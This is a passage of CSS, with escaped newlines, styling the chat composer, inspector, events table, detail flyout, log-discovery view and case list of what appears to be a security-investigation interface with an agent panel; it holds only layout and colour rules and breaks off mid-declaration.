.bi{width:18px;display:grid;place-items:center;color:var(--ink-3)}\n.blast .br b{color:var(--ink-0);font-weight:600}\n.blast .br .ok{color:var(--green);font-weight:600;margin-left:auto;display:flex;align-items:center;gap:5px}\n.permline{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--ink-2);background:var(--green-bg);\n  border:1px solid #bfe6d4;border-radius:var(--r-sm);padding:9px 11px}\n.permline .pl-ic{color:var(--green)} .permline b{color:var(--green);font-weight:700}\n\n/* system event pill */\n.sysevt{align-self:center;display:inline-flex;align-items:center;gap:9px;background:var(--panel);border:1px solid var(--line);\n  border-radius:var(--r-pill);padding:6px 14px;font-size:12px;color:var(--ink-2);box-shadow:var(--sh-xs);animation:rise .35s ease}\n.sysevt .se-ic{width:20px;height:20px;border-radius:6px;display:grid;place-items:center;color:#fff;flex:0 0 auto}\n.sysevt b{color:var(--ink-0);font-weight:600}\n.sysevt .seid{font-family:var(--mono);font-size:11px;color:var(--blue-d);background:var(--blue-bg);padding:1px 7px;border-radius:var(--r-xs)}\n\n/* thinking */\n.thinking{display:flex;gap:12px;animation:rise .3s ease}\n.thinking .body{display:flex;align-items:center;gap:9px;color:var(--ink-3);font-size:12.5px;padding-top:5px}\n.dots{display:flex;gap:4px}\n.dots i{width:6px;height:6px;border-radius:50%;background:var(--accent);animation:bounce 1.2s infinite}\n.dots i:nth-child(2){animation-delay:.18s}.dots i:nth-child(3){animation-delay:.36s}\n\n/* COMPOSER */\n.composer{flex:0 0 auto;padding:6px 0 16px;background:linear-gradient(180deg,transparent,var(--bg) 30%)}\n.composer-in{max-width:760px;margin:0 auto;padding:0 24px}\n.suggest{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px}\n.sg{display:inline-flex;align-items:center;gap:7px;padding:7px 13px;border-radius:var(--r-pill);font-size:12.5px;font-weight:500;\n  background:var(--panel);border:1px solid var(--line-2);color:var(--ink-1);box-shadow:var(--sh-xs);transition:.15s;animation:rise .3s ease backwards}\n.sg:hover{border-color:var(--blue);color:var(--blue-d);background:var(--blue-bg)}\n.sg.act{border-color:var(--amber)} .sg.act:hover{background:var(--amber-bg);color:var(--amber)}\n.sg .sg-ic{opacity:.6}\n.composer-box{display:flex;align-items:flex-end;gap:10px;background:var(--panel);border:1.5px solid var(--line-2);\n  border-radius:var(--r-lg);padding:9px 9px 9px 15px;box-shadow:var(--sh-sm);transition:.15s}\n.composer-box:focus-within{border-color:var(--blue);box-shadow:0 0 0 4px var(--blue-ring)}\n.composer-box textarea{flex:1;border:none;outline:none;resize:none;background:none;font-size:13.5px;color:var(--ink-1);\n  max-height:120px;line-height:1.5;padding:8px 0}\n.composer-box textarea::placeholder{color:var(--ink-4)}\n.send{width:36px;height:36px;border-radius:var(--r-sm);background:var(--blue);color:#fff;display:grid;place-items:center;\n  flex:0 0 auto;transition:.15s;box-shadow:var(--sh-sm)}\n.send:hover{background:var(--blue-d)} .send:disabled{background:var(--line-strong);box-shadow:none;cursor:default}\n.composer-foot{text-align:center;font-size:10.5px;color:var(--ink-4);margin-top:8px;display:flex;align-items:center;justify-content:center;gap:7px}\n.composer-foot .auto-pill{display:inline-flex;align-items:center;gap:5px;color:var(--green)}\n\n/* INSPECTOR */\n.inspector{width:440px;flex:0 0 auto;background:var(--panel);border-left:1px solid var(--line);display:flex;flex-direction:column;min-height:0;\n  transition:width .3s ease,margin .3s ease}\n.inspector.collapsed{width:0;border-left:none;overflow:hidden}\n.insp-empty{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:30px;gap:14px}\n.insp-empty .ill{width:84px;height:84px;border-radius:22px;display:grid;place-items:center;color:var(--accent);\n  background:var(--accent-bg);border:1px solid var(--accent-bg)}\n.insp-empty h3{font-size:14px;font-weight:600;color:var(--ink-0)}\n.insp-empty p{font-size:12.5px;color:var(--ink-3);line-height:1.5;max-width:230px}\n\n.insp-tabs{flex:0 0 auto;display:flex;padding:0 8px;border-bottom:1px solid var(--line);gap:1px;overflow-x:auto}\n.insp-tabs button{padding:22.5px 11px 11px;font-size:12px;font-weight:600;color:var(--ink-3);border-bottom:2px solid transparent;transition:.13s;white-space:nowrap;display:flex;align-items:center;gap:6px}\n.insp-tabs button .cnt{font-size:10px;background:var(--bg-2);color:var(--ink-3);border-radius:var(--r-pill);padding:0 6px;font-weight:600}\n.insp-tabs button:hover{color:var(--ink-1)}\n.insp-tabs button.on{color:var(--blue-d);border-bottom-color:var(--blue)}\n.insp-tabs button.on .cnt{background:var(--blue-bg);color:var(--blue-d)}\n.insp-body{flex:1;overflow-y:auto;padding:16px}\n.insp-sec{margin-bottom:18px}\n.insp-sec h4{font-size:11px;text-transform:uppercase;letter-spacing:.06em;color:var(--ink-3);font-weight:600;margin-bottom:9px;display:flex;align-items:center;gap:7px}\n.narr{font-size:13px;line-height:1.65;color:var(--ink-1);background:var(--accent-bg);border:1px solid var(--accent-bg);\n  border-radius:var(--r-md);padding:13px 14px;position:relative}\n.narr::before{content:\"LIVE NARRATIVE — maintained by agent\";position:absolute;top:-8px;left:12px;font-size:8.5px;font-weight:700;\n  letter-spacing:.05em;color:var(--accent-d);background:var(--panel);padding:0 6px}\n.narr b{color:var(--ink-0);font-weight:600}\n.kv{display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid var(--line);font-size:12.5px}\n.kv:last-child{border-bottom:none}\n.kv .k{color:var(--ink-3)} .kv .v{font-weight:600;color:var(--ink-0);display:flex;align-items:center;gap:7px}\n\n/* evidence cards in inspector */\n.evcard{border:1px solid var(--line);border-radius:var(--r-md);padding:12px;margin-bottom:10px;background:var(--panel);transition:.15s}\n.evcard:hover{box-shadow:var(--sh-sm);border-color:var(--line-2)}\n.evcard .ech{display:flex;align-items:center;gap:8px;margin-bottom:7px}\n.evcard .enum{width:20px;height:20px;border-radius:6px;background:var(--blue);color:#fff;font-size:10px;font-weight:700;display:grid;place-items:center}\n.evcard .ett{font-size:12.5px;font-weight:600;color:var(--ink-0);flex:1}\n.evcard .meta-grid{display:flex;flex-direction:column;gap:7px;font-size:11.5px}\n.evcard .mg{display:flex;gap:8px}\n.evcard .mg .ml{color:var(--ink-3);width:64px;flex:0 0 auto;font-weight:500}\n.evcard .mg .mv{color:var(--ink-1);flex:1}\n.evcard .mg .mv.mono{font-family:var(--mono);font-size:10.5px}\n.evcard .snap{background:var(--bg-2);border-radius:var(--r-sm);padding:7px 9px;font-family:var(--mono);font-size:10.5px;color:var(--ink-2);line-height:1.5;border:1px solid var(--line)}\n.evcard .liverow{display:flex;align-items:center;gap:8px;margin-top:8px;padding-top:8px;border-top:1px dashed var(--line)}\n.evcard .livebadge{display:inline-flex;align-items:center;gap:5px;font-size:10.5px;font-weight:600;color:var(--green);background:var(--green-bg);padding:2px 8px;border-radius:var(--r-pill)}\n.evcard .rerun{margin-left:auto;display:inline-flex;align-items:center;gap:5px;font-size:11px;color:var(--blue-d);font-weight:600}\n.evcard .rerun:hover{text-decoration:underline}\n.evcard .why{font-size:11.5px;color:var(--ink-2);font-style:italic;margin-top:7px;line-height:1.45;padding-left:9px;border-left:2px solid var(--accent)}\n\n/* actions tab */\n.actcard{display:flex;gap:11px;padding:11px;border:1px solid var(--line);border-radius:var(--r-md);margin-bottom:9px;align-items:flex-start}\n.actcard .ai{width:30px;height:30px;border-radius:8px;display:grid;place-items:center;color:#fff;flex:0 0 auto}\n.actcard .ab{flex:1;min-width:0}\n.actcard .at{font-size:12.5px;font-weight:600;color:var(--ink-0)}\n.actcard .ad{font-size:11.5px;color:var(--ink-3);margin-top:2px}\n.actcard .ameta{display:flex;align-items:center;gap:8px;margin-top:6px;font-size:10.5px;color:var(--ink-4)}\n.actcard .st{font-size:10px;font-weight:700;padding:2px 8px;border-radius:var(--r-pill);text-transform:uppercase;letter-spacing:.03em}\n.actcard .st.done{color:var(--green);background:var(--green-bg)} .actcard .st.prop{color:var(--amber);background:var(--amber-bg)}\n.actcard .undo{font-size:11px;color:var(--blue-d);font-weight:600;margin-top:6px}\n.avail{padding:11px;border:1px dashed var(--line-strong);border-radius:var(--r-md);margin-top:4px}\n.avail h5{font-size:11px;text-transform:uppercase;letter-spacing:.05em;color:var(--ink-3);margin-bottom:9px;font-weight:600}\n.avail-btn{width:100%;display:flex;align-items:center;gap:9px;padding:9px 10px;border-radius:var(--r-sm);background:var(--bg-2);\n  margin-bottom:6px;font-size:12.5px;font-weight:500;color:var(--ink-1);transition:.13s;border:1px solid transparent}\n.avail-btn:hover{background:var(--panel);border-color:var(--line-2);box-shadow:var(--sh-xs)}\n.avail-btn .abi{color:var(--ink-3)} .avail-btn .lk{margin-left:auto}\n\n/* people tab */\n.person{display:flex;align-items:center;gap:11px;padding:10px;border-radius:var(--r-md);margin-bottom:6px;transition:.13s}\n.person:hover{background:var(--bg-2)}\n.person .pmeta{flex:1}\n.person .pn{font-size:12.5px;font-weight:600;color:var(--ink-0);display:flex;align-items:center;gap:7px}\n.person .pr{font-size:11px;color:var(--ink-3)}\n.person .ptag{font-size:9.5px;font-weight:700;padding:2px 7px;border-radius:var(--r-pill);text-transform:uppercase;letter-spacing:.03em}\n.ptag.owner{color:var(--blue-d);background:var(--blue-bg)} .ptag.assignee{color:var(--green);background:var(--green-bg)}\n.ptag.ment{color:var(--violet);background:var(--violet-bg)} .ptag.agent{color:var(--accent-d);background:var(--accent-bg)}\n.add-person{width:100%;display:flex;align-items:center;justify-content:center;gap:8px;padding:10px;border-radius:var(--r-sm);\n  border:1px dashed var(--line-strong);color:var(--ink-3);font-weight:600;font-size:12px;margin-top:4px;transition:.13s}\n.add-person:hover{border-color:var(--blue);color:var(--blue-d);background:var(--blue-bg)}\n\n/* assignee mini-picker */\n.picker-pop{position:absolute;background:var(--panel);border:1px solid var(--line);border-radius:var(--r-md);box-shadow:var(--sh-lg);\n  padding:7px;z-index:80;min-width:230px;animation:pop .15s ease}\n.picker-pop .pp-row{display:flex;align-items:center;gap:10px;padding:8px;border-radius:var(--r-sm);cursor:pointer;transition:.12s}\n.picker-pop .pp-row:hover{background:var(--bg-2)}\n.picker-pop .pp-n{font-size:12.5px;font-weight:600;color:var(--ink-0)} .picker-pop .pp-r{font-size:11px;color:var(--ink-3)}\n\n/* toast */\n.toasts{position:fixed;bottom:22px;left:50%;transform:translateX(-50%);z-index:200;display:flex;flex-direction:column;gap:9px;align-items:center}\n.toast{display:flex;align-items:center;gap:11px;background:var(--ink-0);color:#fff;border-radius:var(--r-md);padding:12px 16px;\n  box-shadow:var(--sh-lg);font-size:13px;font-weight:500;animation:toastin .3s cubic-bezier(.2,.7,.2,1);max-width:440px}\n.toast .tic{width:24px;height:24px;border-radius:7px;display:grid;place-items:center;flex:0 0 auto}\n.toast.ok .tic{background:var(--green)} .toast.info .tic{background:var(--blue)} .toast.warn .tic{background:var(--amber)}\n.toast b{font-weight:700}\n.toast .tsub{color:rgba(255,255,255,.7);font-size:11.5px;font-weight:400}\n\n/* promote picker overlay card */\n.promote{border:1.5px solid var(--accent);border-radius:var(--r-lg);background:var(--panel);overflow:hidden;\n  box-shadow:0 10px 32px var(--accent-ring);animation:rise .4s cubic-bezier(.2,.7,.2,1)}\n.promote .ph{padding:13px 16px;border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--accent-bg),transparent)}\n.promote .ph .pt{font-weight:700;font-size:13.5px;color:var(--ink-0);display:flex;align-items:center;gap:9px}\n.promote .ph .ps{font-size:12px;color:var(--ink-2);margin-top:4px;line-height:1.5}\n.promote-grid{padding:13px;display:grid;grid-template-columns:1fr 1fr;gap:9px}\n.ptype{text-align:left;border:1px solid var(--line);border-radius:var(--r-md);padding:12px;transition:.15s;background:var(--panel-2);position:relative}\n.ptype:hover{border-color:var(--accent);box-shadow:var(--sh-sm);transform:translateY(-1px)}\n.ptype.full::after{content:\"recommended\";position:absolute;top:10px;right:10px;font-size:8.5px;font-weight:700;letter-spacing:.04em;\n  text-transform:uppercase;color:var(--accent-d);background:var(--accent-bg);padding:2px 7px;border-radius:var(--r-pill)}\n.ptype .pti{width:30px;height:30px;border-radius:8px;display:grid;place-items:center;color:#fff;margin-bottom:9px}\n.ptype .ptn{font-size:13px;font-weight:700;color:var(--ink-0)}\n.ptype .ptd{font-size:11px;color:var(--ink-3);margin-top:3px;line-height:1.4}\n.ptype .ptspine{font-size:10px;color:var(--ink-4);margin-top:7px;font-family:var(--mono);line-height:1.4}\n\n/* events table (in-chat) */\n.events-card{border:1px solid var(--line);border-radius:var(--r-md);background:var(--panel);overflow:hidden;box-shadow:var(--sh-xs)}\n.events-h{display:flex;align-items:center;gap:8px;padding:10px 12px;background:var(--panel-2);border-bottom:1px solid var(--line);font-size:12px;color:var(--ink-1)}\n.events-h b{color:var(--ink-0);font-weight:600}\n.events-h .ev-hint{color:var(--ink-4);font-weight:400}\n.ev-scroll{max-height:288px;overflow:auto}\n.ev-table{width:100%;border-collapse:collapse;font-size:12px}\n.ev-table th{position:sticky;top:0;background:var(--panel);text-align:left;font-weight:600;color:var(--ink-3);font-size:10.5px;text-transform:uppercase;letter-spacing:.04em;padding:8px 10px;border-bottom:1px solid var(--line);z-index:1}\n.ev-table td{padding:8px 10px;border-bottom:1px solid var(--line);color:var(--ink-1);white-space:nowrap}\n.ev-table tbody tr:last-child td{border-bottom:none}\n.ev-row{cursor:pointer;transition:background .12s}\n.ev-row:hover{background:var(--blue-bg)}\n.ev-row.flag{background:var(--red-bg)}\n.ev-row.flag:hover{background:#fbdfe2}\n.ev-table td.evcmd{font-size:11px;color:var(--ink-2);max-width:236px;overflow:hidden;text-overflow:ellipsis}\n.ev-table td.evchev{color:var(--ink-4);width:22px;text-align:right}\n.ev-row:hover td.evchev{color:var(--blue)}\n.risk-pill{display:inline-block;font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:.03em;padding:2px 8px;border-radius:var(--r-pill)}\n.risk-pill.lg{font-size:11px;padding:4px 11px}\n.view-events-btn{display:inline-flex;align-items:center;gap:8px;margin-top:11px;height:34px;padding:0 14px;border-radius:var(--r-sm);\n  background:var(--panel);border:1px solid var(--line-2);color:var(--blue-d);font-weight:600;font-size:12.5px;cursor:pointer;transition:.14s;box-shadow:var(--sh-xs)}\n.view-events-btn:hover{border-color:var(--blue);background:var(--blue-bg)}\n\n/* flyout (right-side, EUI-style overlay) */\n.flyout-backdrop{position:fixed;inset:0;background:rgba(18,22,35,.38);opacity:0;pointer-events:none;transition:opacity .26s ease;z-index:300}\n.flyout-backdrop.open{opacity:1;pointer-events:auto}\n.flyout{position:fixed;top:0;right:0;height:100vh;width:496px;max-width:94vw;background:var(--panel);box-shadow:var(--sh-lg);\n  transform:translateX(100%);transition:transform .34s cubic-bezier(.2,.75,.2,1);z-index:310;display:flex;flex-direction:column}\n.flyout.open{transform:translateX(0)}\n.flyout-inner{display:flex;flex-direction:column;height:100%;min-height:0}\n.fly-h{flex:0 0 auto;display:flex;align-items:flex-start;gap:12px;padding:18px 20px;border-bottom:1px solid var(--line);background:var(--panel-2)}\n.fly-htext{flex:1;min-width:0}\n.fly-eyebrow{font-size:10.5px;font-weight:600;text-transform:uppercase;letter-spacing:.05em;color:var(--ink-4)}\n.fly-title{display:flex;align-items:center;gap:9px;font-size:17px;font-weight:600;letter-spacing:-.01em;color:var(--ink-0);margin-top:4px;font-family:var(--mono)}\n.fly-close{width:32px;height:32px;border-radius:var(--r-sm);display:grid;place-items:center;color:var(--ink-3);transition:.13s;flex:0 0 auto}\n.fly-close:hover{background:var(--bg-2);color:var(--ink-1)}\n.fly-body{flex:1;overflow-y:auto;padding:18px 20px;display:flex;flex-direction:column;gap:18px}\n.fly-why{display:flex;gap:11px;background:var(--red-bg);border:1px solid #f3d0d4;border-radius:var(--r-md);padding:12px 13px;font-size:12.5px;color:var(--ink-1);line-height:1.5}\n.fly-why .fwi{color:var(--red-d);margin-top:1px}\n.fly-why b{color:var(--red-d);font-weight:700;display:block;margin-bottom:2px}\n.fly-sec h5{font-size:10.5px;font-weight:600;text-transform:uppercase;letter-spacing:.05em;color:var(--ink-3);margin-bottom:9px;display:flex;align-items:center;gap:8px}\n.fly-sec h5 .dec-tag{font-size:9px;font-weight:700;color:var(--violet);background:var(--violet-bg);padding:1px 6px;border-radius:var(--r-pill);letter-spacing:.02em}\n.fly-kvs{display:flex;flex-direction:column;border:1px solid var(--line);border-radius:var(--r-sm);overflow:hidden}\n.fly-kv{display:flex;justify-content:space-between;gap:14px;padding:8px 12px;font-size:12px;border-bottom:1px solid var(--line);background:var(--panel)}\n.fly-kv:nth-child(even){background:var(--panel-2)}\n.fly-kv:last-child{border-bottom:none}\n.fly-kv .fk{color:var(--ink-3)}\n.fly-kv .fv{color:var(--ink-0);font-weight:500;text-align:right;word-break:break-all}\n.fly-code{font-family:var(--mono);font-size:11.5px;line-height:1.55;color:var(--ink-1);background:var(--bg-2);border:1px solid var(--line);\n  border-radius:var(--r-sm);padding:11px 12px;word-break:break-all;white-space:pre-wrap}\n.fly-code.decoded{background:#fff7f7;border-color:#f3d0d4;color:var(--red-d)}\n.fly-lineage{font-size:12px;color:var(--ink-1);background:var(--bg-2);border:1px solid var(--line);border-radius:var(--r-sm);padding:10px 12px}\n.fly-net{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--ink-1);background:var(--bg-2);border:1px solid var(--line);border-radius:var(--r-sm);padding:10px 12px}\n.fly-net.bad{color:var(--red-d);background:var(--red-bg);border-color:#f3d0d4}\n\n/* ===== multi-app panel: chrome ===== */\n.body{position:relative}\n.inspector{position:relative}\n.inspector.resizing{transition:none}\n.inspector.maximized{position:absolute;top:0;right:0;bottom:0;width:auto!important;z-index:30;box-shadow:-14px 0 44px rgba(20,25,40,.13)}\n.resize-handle{position:absolute;left:-3px;top:0;bottom:0;width:7px;cursor:col-resize;z-index:25}\n.resize-handle::after{content:\"\";position:absolute;left:3px;top:0;bottom:0;width:1px;background:transparent;transition:.15s}\n.resize-handle:hover::after{background:var(--blue);width:2px;left:2px}\n.inspector.maximized .resize-handle{display:none}\n.panel-appbar{flex:0 0 auto;display:flex;align-items:center;gap:6px;height:42px;padding:0 6px 0 8px;background:var(--panel)}\n.app-tabs{flex:1;display:flex;align-items:center;gap:2px;overflow-x:auto;height:100%;padding-top:0;scrollbar-width:none}\n.app-tabs::-webkit-scrollbar{display:none}\n.app-tab{display:flex;align-items:center;gap:7px;height:30px;padding:0 7px 0 11px;border-radius:var(--r-sm);color:var(--ink-3);font-weight:600;font-size:12.5px;white-space:nowrap;transition:.13s;border:1px solid transparent}\n.app-tab:hover{background:var(--bg-2);color:var(--ink-1)}\n.app-tab.on{background:var(--panel);color:var(--ink-0);border-color:var(--line);box-shadow:var(--sh-xs)}\n.app-tab .ati{display:grid;place-items:center;color:var(--ink-4)}\n.app-tab.on .ati{color:var(--blue)}\n.app-div{flex:0 0 auto;width:1px;height:18px;background:var(--line-strong);margin:0 4px}\n.app-tab.subject{flex:0 0 auto;padding-left:9px}\n.app-tab.subject .ati{color:var(--tc)}\n.app-tab.subject .atn{max-width:172px;overflow:hidden;text-overflow:ellipsis}\n.app-tab.subject:not(.on):hover{background:color-mix(in srgb,var(--tc) 8%,transparent);color:var(--ink-1)}\n.app-tab.subject.on{background:var(--panel);border-color:var(--line);color:var(--ink-0);box-shadow:var(--sh-xs)}\n.app-tab.subject.on .ati{color:var(--tc)}\n.app-tab .atx{display:grid;place-items:center;width:16px;height:16px;border-radius:4px;color:var(--ink-4);opacity:.55;transition:.12s}\n.app-tab:hover .atx{opacity:1}\n.app-tab .atx:hover{background:var(--line-2);color:var(--ink-1)}\n.app-add{width:28px;height:28px;border-radius:var(--r-sm);display:grid;place-items:center;color:var(--ink-3);flex:0 0 auto;transition:.13s}\n.app-add:hover{background:var(--bg-2);color:var(--blue)}\n.app-tools{flex:0 0 auto;display:flex;align-items:center;gap:2px;padding-left:4px}\n.ptool{width:30px;height:30px;border-radius:var(--r-sm);display:grid;place-items:center;color:var(--ink-3);transition:.13s}\n.ptool:hover{background:var(--bg-2);color:var(--ink-1)}\n.panel-content{flex:1;min-height:0;display:flex;flex-direction:column;overflow:hidden}\n.add-menu{position:fixed;background:var(--panel);border:1px solid var(--line);border-radius:var(--r-md);box-shadow:var(--sh-lg);padding:6px;z-index:320;min-width:200px;animation:pop .14s ease}\n.add-row{width:100%;display:flex;align-items:center;gap:10px;padding:8px 10px;border-radius:var(--r-sm);font-size:12.5px;font-weight:500;color:var(--ink-1);transition:.12s}\n.add-row:hover{background:var(--bg-2)}\n.add-row .ari{color:var(--ink-3);display:grid;place-items:center}\n.add-empty{padding:9px 11px;font-size:12px;color:var(--ink-4)}\n\n/* discover */\n.disco{display:flex;flex-direction:column;height:100%;min-height:0}\n.disco-bar{flex:0 0 auto;display:flex;align-items:center;gap:8px;padding:10px 12px;border-bottom:1px solid var(--line);flex-wrap:wrap}\n.dv-sel,.time-sel{display:flex;align-items:center;gap:7px;height:32px;padding:0 11px;border-radius:var(--r-sm);border:1px solid var(--line-2);background:var(--panel);color:var(--ink-2);font-size:12px;font-weight:500;white-space:nowrap}\n.dv-sel b{color:var(--ink-0);font-weight:600}\n.dv-sel:hover,.time-sel:hover{border-color:var(--line-strong)}\n.kql{flex:1;min-width:160px;display:flex;align-items:center;gap:8px;height:32px;padding:0 11px;border-radius:var(--r-sm);background:var(--bg-2);border:1px solid var(--line)}\n.kql-ic{color:var(--ink-4);flex:0 0 auto}\n.kql-q{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:11px;color:var(--ink-2)}\n.dv-refresh{width:32px;height:32px;border-radius:var(--r-sm);display:grid;place-items:center;background:var(--blue);color:#fff;flex:0 0 auto}\n.dv-refresh:hover{background:var(--blue-d)}\n.disco-hist{flex:0 0 auto;padding:10px 12px;border-bottom:1px solid var(--line)}\n.dh-head{display:flex;align-items:baseline;justify-content:space-between;margin-bottom:7px;font-size:12px;color:var(--ink-2)}\n.dh-head b{color:var(--ink-0);font-size:13px}\n.dh-sub{font-size:10.5px;color:var(--ink-4)}\n.dh-bars{display:flex;align-items:flex-end;gap:3px;height:54px;border-bottom:1px solid var(--line-2)}\n.dh-bar{flex:1;min-height:2px;background:var(--bg-2);border-radius:2px 2px 0 0;transition:.15s}\n.disco-body{flex:1;min-height:0;display:flex}\n.disco-fields{width:178px;flex:0 0 auto;border-right:1px solid var(--line);display:flex;flex-direction:column;min-height:0}\n.df-head{flex:0 0 auto;padding:9px 12px;font-size:10.5px;font-weight:600;text-transform:uppercase;letter-spacing:.05em;color:var(--ink-3);border-bottom:1px solid var(--line)}\n.df-list{flex:1;overflow-y:auto;padding:5px}\n.df-row{width:100%;display:flex;align-items:center;gap:7px;padding:6px 7px;border-radius:var(--r-xs);transition:.12s;color:var(--ink-1)}\n.df-row:hover{background:var(--bg-2)}\n.df.open>.df-row{background:var(--blue-bg)}\n.df-t{color:var(--ink-4);display:grid;place-items:center;flex:0 0 auto}\n.df-n{font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}\n.df-x{color:var(--ink-4);flex:0 0 auto;transition:.15s}\n.df.open .df-x{transform:rotate(180deg)}\n.df-vals{padding:3px 7px 9px 20px;display:flex;flex-direction:column;gap:6px}\n.df-val{display:flex;align-items:center;gap:7px;font-size:10.5px;color:var(--ink-2)}\n.df-val .mono{flex:0 0 auto;width:74px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}\n.df-bar{flex:1;height:5px;background:var(--bg-2);border-radius:3px;overflow:hidden}\n.df-bar i{display:block;height:100%;background:var(--blue);border-radius:3px}\n.df-pct{color:var(--ink-4);flex:0 0 auto;width:30px;text-align:right}\n.disco-docs{flex:1;min-width:0;display:flex;flex-direction:column;min-height:0}\n.docs-head{flex:0 0 auto;padding:9px 12px;font-size:12px;color:var(--ink-2);border-bottom:1px solid var(--line)}\n.docs-head b{color:var(--ink-0)}\n.docs-hint{color:var(--ink-4)}\n.docs-scroll{flex:1;overflow:auto}\n.docs-table{width:100%;border-collapse:collapse;font-size:11.5px;table-layout:fixed}\n.doc-row{cursor:pointer;border-bottom:1px solid var(--line);transition:.12s}\n.doc-row:hover{background:var(--blue-bg)}\n.doc-row.flag{background:var(--red-bg)}\n.doc-row.flag:hover{background:#fbdfe2}\n.doc-row td{padding:8px 10px;vertical-align:top}\n.doc-exp{width:22px;color:var(--ink-4)}\n.doc-time{width:104px;color:var(--ink-2);white-space:nowrap}\n.doc-sum{color:var(--ink-2);line-height:1.7;word-break:break-word}\n.ds-pair{margin-right:5px}\n.ds-pair b{color:var(--ink-4);font-weight:600}\n.ds-risk{font-weight:700;margin-left:2px}\n\n/* records */\n.records{display:flex;flex-direction:column;height:100%;min-height:0}\n.rec-toolbar{flex:0 0 auto;display:flex;align-items:center;gap:10px;padding:11px 12px 9px}\n.rec-search{flex:1;display:flex;align-items:center;gap:8px;height:32px;padding:0 11px;border-radius:var(--r-sm);background:var(--bg-2);border:1px solid var(--line);color:var(--ink-4)}\n.rec-search input{flex:1;border:none;background:none;outline:none;font-size:12.5px;color:var(--ink-1)}\n.rec-count{font-size:11.5px;color:var(--ink-3);white-space:nowrap}\n.rec-views{flex:0 0 auto;display:flex;gap:6px;padding:0 12px 10px;flex-wrap:wrap;border-bottom:1px solid var(--line)}\n.rv{display:flex;align-items:center;gap:6px;height:28px;padding:0 11px;border-radius:var(--r-pill);font-size:12px;font-weight:600;color:var(--ink-3);background:var(--bg-2);transition:.12s}\n.rv:hover{color:var(--ink-1)}\n.rv.on{background:var(--blue);color:#fff}\n.rv-c{font-size:10px;background:rgba(0,0,0,.12);padding:0 6px;border-radius:var(--r-pill)}\n.rv.on .rv-c{background:rgba(255,255,255,.22)}\n.rec-scroll{flex:1;overflow:auto}\n.rec-table{width:100%;border-collapse:collapse;font-size:12px}\n.rec-table th{position:sticky;top:0;background:var(--panel);text-align:left;font-weight:600;color:var(--ink-3);font-size:10.5px;text-transform:uppercase;letter-spacing:.04em;padding:9px 10px;border-bottom:1px solid var(--line);white-space:nowrap;cursor:pointer;user-select:none}\n.rec-table th:hover{color:var(--ink-1)}\n.rec-table th.sorted{color:var(--blue-d)}\n.rec-table td{padding:9px 10px;border-bottom:1px solid var(--line);vertical-align:middle}\n.rec-row{cursor:pointer;transition:.12s}\n.rec-row:hover{background:var(--bg-2)}\n.rec-row.cur{background:var(--blue-bg)}\n.type-badge.sm{height:22px;padding:2px 8px;font-size:10.5px;gap:5px}\n.rec-title{font-weight:600;color:var(--ink-0);max-width:230px}\n.rec-title .badge-ai{margin-left:6px;vertical-align:middle}\n.rec-id{font-family:var(--mono);font-size:10px;color:var(--ink-4);font-weight:400;margin-top:2px}\n.rec-status{display:inline-flex;align-items:center;gap:7px;color:var(--ink-1);white-space:nowrap}\n.rec-status .dot{width:7px;height:7px;border-radius:50%;flex:0 0 auto}\n.rec-upd{color:var(--ink-3);white-space:nowrap;font-size:11.5px}\n.cases-page{display:flex;flex-direction:column;height:100%;min-height:0}\n.cs-stats{flex:0 0 auto;display:grid;grid-template-columns:repeat(4,1fr);border:1px solid var(--line);border-radius:var(--r-md);margin:12px 12px 4px;background:var(--panel)}\n.cs-stat{padding:13px 16px;border-right:1px solid var(--line)}\n.cs-stat:last-child{border-right:none}\n.cs-stat-k{font-size:12px;color:var(--ink-2);display:flex;align-items:center;gap:5px}\n.cs-stat-k svg{color:var(--ink-4)}\n.cs-stat-v{font-size:22px;font-weight:700;color:var(--ink-0);margin-top:5px;letter-spacing:-.01em}\n.cs-filters{flex:0 0 auto;display:flex;align-items:center;gap:8px;padding:11px 12px 10px;flex-wrap:wrap}\n.cs-search{flex:1;min-width:220px;display:flex;align-items:center;gap:8px;height:34px;padding:0 11px;border-radius:var(--r-sm);background:var(--bg-2);border:1px solid var(--line);color:var(--ink-4)}\n.cs-search input{flex:1;border:none;background:none;outline:none;font:inherit;font-size:12.5px;color:var(--ink-0)}\n.cs-fchip{display:inline-flex;align-items:center;gap:7px;height:34px;padding:0 12px;border-radius:var(--r-sm);background:var(--panel);border:1px solid var(--line);font-size:12.5px;font-weight:500;color:var(--ink-1);cursor:pointer}\n.cs-fchip:hover{background:var(--bg-2)}\n.cs-fbadge{font-size:11px;font-weight:600;background:var(--bg-2);color:var(--ink-2);padding:1px 7px;border-radius:var(--r-pill)}\n.cs-fchip svg{color:var(--ink-3)}\n.cs-subbar{flex:0 0 auto;display:flex;align-items:center;gap:13px;padding:0 14px 9px;font-size:12px;color:var(--ink-3);border-bottom:1px solid var(--line)}\n.cs-link{display:inline-flex;align-items:center;gap:5px;background:none;border:none;color:var(--blue-d);font:inherit;font-size:12px;font-weight:500;cursor:pointer;padding:0}\n.cs-link:hover{text-decoration:underline}\n.cs-sep{width:1px;height:14px;background:var(--line)}\n.cs-scroll{flex:1;overflow:auto}\n.cs-table{width:100%;border-collapse:collapse;font-size:12px}\n.cs-table th{position:sticky;top:0;background:var(--panel);text-align:left;font-weight:600;color:var(--ink-2);font-size:12px;padding:10px 12px;border-bottom:1px solid var(--line);white-space:nowrap}\n.cs-table th .so{color:var(--ink-4);margin-left:3px;font-size:10px}\n.cs-table td{padding:11px 12px;border-bottom:1px solid var(--line);vertical-align:middle;color:var(--ink-1);white-space:nowrap}\n.cs-table tbody tr{cursor:pointer;transition:.12s}\n.cs-table tbody tr:hover{background:var(--bg-2)}\n.cs-cb{width:15px;height:15px;border:1.5px solid var(--ink-5);border-radius:4px;display:inline-block;vertical-align:middle}\n.cs-name{color:var(--blue-d);font-weight:600;max-width:200px;white-space:normal;line-height:1.4}\n.cs-dash{color:var(--ink-4)}\n.cs-av{display:inline-grid;place-items:center;width:22px;height:22px;border-radius:50%;color:#fff;font-size:9px;font-weight:700;border:1.5px solid 